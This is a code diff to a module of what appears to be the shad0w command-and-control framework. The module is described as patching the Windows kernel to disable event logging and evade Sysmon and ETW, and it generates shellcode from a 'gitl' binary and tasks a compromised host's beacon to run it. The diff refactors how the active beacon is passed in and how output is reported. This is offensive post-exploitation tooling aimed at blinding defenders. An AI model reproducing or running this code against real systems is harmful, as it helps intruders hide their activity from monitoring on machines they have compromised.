@@ -14,24 +14,26 @@ from lib import shellcode
 __description__ = "Universally Evade Sysmon and ETW - Patch the kernel to disable windows event logging"
 __author__ = "@_batsec_"
 
+# beacon to exec command on
+current_beacon = None
+
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
 # location of rubeus binary
-RUBEUS_BIN = "/root/shad0w/bin/gitl.x64.exe"
+GITL_BIN = "/root/shad0w/bin/gitl.x64.exe"
 
 # did the command error
 ERROR = False
 error_list = ""
 
 # let argparse error and exit nice
-
 def error(message):
     global ERROR, error_list
     ERROR = True
     error_list += f"\033[0;31m{message}\033[0m\n"
 
-def exit(status=0, message=None): 
+def exit(status=0, message=None):
     if message != None: print(message)
     return
 
@@ -42,7 +44,7 @@ def ghostinthelogs_callback(shad0w, data):
     data = data.replace("[i]", "\033[1;34m[i]\033[0m")
     data = data.replace("[*]", "\033[1;34m[*]\033[0m")
 
-    print('\n'.join(data.splitlines()[3:]))
+    shad0w.event.beacon_info(current_beacon, '\n'.join(data.splitlines()[3:]))
 
     return ""
 
@@ -53,25 +55,21 @@ def set_and_send(shad0w, args):
     args.appdomain = False
 
     # generate the shellcode
-    b64_comp_data = shellcode.generate(RUBEUS_BIN, args, args.param)
+    b64_comp_data = shellcode.generate(GITL_BIN, args, args.param)
 
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = ghostinthelogs_callback
-
-    # inform the user of the change
-    shad0w.debug.log(f"Tasked beacon ({shad0w.current_beacon})", log=True)
+    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+    shad0w.beacons[current_beacon]["callback"] = ghostinthelogs_callback
 
     return
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
 
     raw_args = args
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
     # usage examples
     usage_examples = """
